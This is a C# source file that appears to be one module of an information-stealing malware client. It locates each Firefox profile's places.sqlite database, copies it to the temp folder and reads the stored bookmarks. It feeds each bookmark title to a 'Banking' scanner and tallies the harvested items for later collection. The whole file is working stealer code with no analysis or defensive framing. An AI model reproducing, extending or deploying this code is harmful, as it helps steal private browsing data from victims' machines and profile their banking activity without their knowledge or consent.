using System;
using System.Collections.Generic;
using System.IO;
using Client.Modules.Passwords.Helpers;
using Client.Modules.Passwords.Targets.Browsers.Chromium;

namespace Client.Modules.Passwords.Targets.Browsers.Firefox;

internal class cBookmarks
{
	private static string GetBookmarksDBPath(string path)
	{
		try
		{
			string path2 = path + "\\Profiles";
			if (Directory.Exists(path2))
			{
				string[] directories = Directory.GetDirectories(path2);
				foreach (string text in directories)
				{
					if (File.Exists(text + "\\places.sqlite"))
					{
						return text + "\\places.sqlite";
					}
				}
			}
		}
		catch
		{
		}
		return null;
	}

	public static List<Bookmark> Get(string path)
	{
		List<Bookmark> list = new List<Bookmark>();
		try
		{
			string bookmarksDBPath = GetBookmarksDBPath(path);
			if (!File.Exists(bookmarksDBPath))
			{
				return list;
			}
			string text = Path.GetTempPath() + "\\places.raw";
			if (File.Exists(text))
			{
				File.Delete(text);
			}
			File.Copy(bookmarksDBPath, text);
			SQLite sQLite = new SQLite(text);
			sQLite.ReadTable("moz_bookmarks");
			if (sQLite.GetRowCount() == 65536)
			{
				return new List<Bookmark>();
			}
			for (int i = 0; i < sQLite.GetRowCount(); i++)
			{
				Bookmark item = default(Bookmark);
				item.sTitle = Crypto.GetUTF8(sQLite.GetValue(i, 5));
				if (Crypto.GetUTF8(sQLite.GetValue(i, 1)).Equals("0") && item.sTitle != "0")
				{
					Banking.ScanData(item.sTitle);
					Counter.Bookmarks++;
					list.Add(item);
				}
			}
			return list;
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
		return new List<Bookmark>();
	}
}
